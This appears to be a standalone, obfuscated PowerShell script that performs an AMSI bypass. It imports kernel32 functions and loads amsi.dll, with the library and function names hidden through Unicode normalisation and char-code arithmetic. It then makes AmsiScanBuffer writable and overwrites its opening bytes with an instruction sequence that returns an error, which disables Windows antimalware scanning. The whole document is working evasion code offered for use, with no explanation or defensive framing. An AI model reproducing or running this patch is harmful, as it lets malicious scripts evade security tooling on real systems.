$EmYBk = @"
using System;
using System.Runtime.InteropServices;
public class EmYBk {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr _yvjIZtiXaTDDJ, string Jzyj6fWV1jbBJ5TY7l);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr nCtyaEDAmPntP7E4, UIntPtr rxist, uint U9_8wpUKX, out uint cZo_0XB3p8rV0eJIZlA);
}
"@

Add-Type $EmYBk

$omzvK12AUaeY2 = [EmYBk]::LoadLibrary("$(('ãmsí'+'.dll').NORmaliZE([CHar]([BYtE]0x46)+[ChAR](23+88)+[CHar]([BYTe]0x72)+[ChaR]([bYTe]0x6d)+[chAr]([bYtE]0x44)) -replace [char]([bYTe]0x5c)+[chAr]([Byte]0x70)+[CHAR](123+117-117)+[CHaR]([BytE]0x4d)+[chaR](75+35)+[ChaR](125+116-116))")
$smcpPursPgh = [EmYBk]::GetProcAddress($omzvK12AUaeY2, "$(('Ãm'+'sî'+'Sc'+'ãn'+'Bù'+'ff'+'èr').nOrmaLIze([CHaR]([ByTE]0x46)+[cHAr](111)+[CHar]([ByTE]0x72)+[chAr]([BytE]0x6d)+[cHar](68*24/24)) -replace [ChaR](92)+[chAR](112)+[chaR]([bYte]0x7b)+[CHaR]([byTE]0x4d)+[cHaR]([BYTe]0x6e)+[cHAr](125+12-12))")
$p = 0
[EmYBk]::VirtualProtect($smcpPursPgh, [uint32]5, 0x40, [ref]$p)
$EkJ18fkmLSI8B = "0xB8"
$XHJq9mS2mUKdWHge = "0x57"
$K2jGXyo9Oyao8X = "0x00"
$_xY7h_AbG = "0x07"
$gaO6 = "0x80"
$ClK = "0xC3"
$dKxVBE0om46PK6glPG3_ = [Byte[]] ($EkJ18fkmLSI8B,$XHJq9mS2mUKdWHge,$K2jGXyo9Oyao8X,$_xY7h_AbG,+$gaO6,+$ClK)
[System.Runtime.InteropServices.Marshal]::Copy($dKxVBE0om46PK6glPG3_, 0, $smcpPursPgh, 6)